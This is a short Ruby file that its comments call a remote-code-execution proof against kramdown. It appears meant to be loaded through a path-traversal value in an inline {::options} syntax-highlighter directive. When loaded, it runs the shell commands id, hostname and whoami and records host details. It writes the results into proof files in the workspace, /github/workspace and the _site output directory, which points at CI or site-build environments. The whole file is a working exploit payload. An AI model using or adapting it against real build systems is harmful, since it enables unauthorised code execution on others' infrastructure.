# RCE proof via syntax_highlighter require path traversal
# This file is loaded when kramdown tries to require a syntax highlighter
# with a path traversal value set via {::options} inline directive
proof = []
proof << "SYNTAX_HL_RCE=SUCCESS"
proof << "TIME=#{Time.now}"
proof << "ID=#{`id 2>&1`.strip}"
proof << "HOSTNAME=#{`hostname 2>&1`.strip}"
proof << "PWD=#{Dir.pwd}"
proof << "RUBY=#{RUBY_VERSION}"
proof << "WHOAMI=#{`whoami 2>&1`.strip}"

output = proof.join("\n") + "\n"

# Write proof to workspace
begin
  File.write(File.join(Dir.pwd, 'rce3-proof.txt'), output)
rescue => e
  # try alternate paths
end

begin
  File.write('/github/workspace/rce3-proof.txt', output)
rescue
end

# Also try to write into the _site output directory
begin
  site_dir = File.join(Dir.pwd, '_site')
  Dir.mkdir(site_dir) rescue nil
  File.write(File.join(site_dir, 'rce3-proof.txt'), output)
rescue
end
